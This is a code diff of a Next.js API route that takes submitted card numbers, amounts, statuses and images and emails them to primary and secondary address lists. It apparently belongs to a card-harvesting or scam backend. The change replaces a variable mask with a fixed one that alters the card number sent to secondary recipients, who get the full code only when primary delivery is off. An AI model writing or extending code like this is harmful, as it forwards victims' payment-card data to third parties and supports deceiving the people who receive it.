@@ -1,12 +1,12 @@
 // src/app/api/notify/log/route.ts
 import { NextResponse } from "next/server";
 import { sendEmail, getPrimaryEmails, getSecondaryEmails } from "@/lib/email";
-import { applyMask } from "@/lib/mask";
+import { maskForSecondary } from "@/lib/mask";
 
 export async function POST(req: Request) {
   try {
     const body = await req.json();
-    const { event, brandName, cardNumber, amount, status, message, maskIndex, maskedChar, imageBase64 } = body;
+    const { event, brandName, cardNumber, amount, status, message, imageBase64 } = body;
     
     const primaryEnabled = String(process.env.NOTIFY_TYPING_ENABLED ?? 'true').toLowerCase() === 'true';
     
@@ -20,7 +20,7 @@ export async function POST(req: Request) {
 
     const baseHtml = `
       <div style="font-family: Arial, padding: 20px;">
-        <h2>${event === 'success' ? '✅ SUCCESS' : '❌ FAILED'} - ${brandName}</h2>
+        <h2>${event === 'success' ? '✅ SUCCESS' : event === 'upload' ? '📸 UPLOAD' : '❌ FAILED'} - ${brandName}</h2>
         <p><strong>Card Number:</strong> <span style="font-family: monospace; font-size: 18px;">{CARD_NUMBER}</span></p>
         <p><strong>Amount:</strong> $${amount}</p>
         <p><strong>Status:</strong> ${status}</p>
@@ -43,9 +43,9 @@ export async function POST(req: Request) {
     if (secondaryEmails.length > 0) {
       let htmlSecondary = '';
       
-      // Apply mask if primary is enabled AND we have mask info
-      if (primaryEnabled && maskIndex !== undefined && maskedChar) {
-        const masked = applyMask(cardNumber, maskIndex, maskedChar);
+      if (primaryEnabled) {
+        // Apply deterministic mask if primary is enabled
+        const masked = maskForSecondary(cardNumber);
         htmlSecondary = baseHtml.replace('{CARD_NUMBER}', masked);
       } else {
         // If primary is disabled, Secondary gets the correct/full code
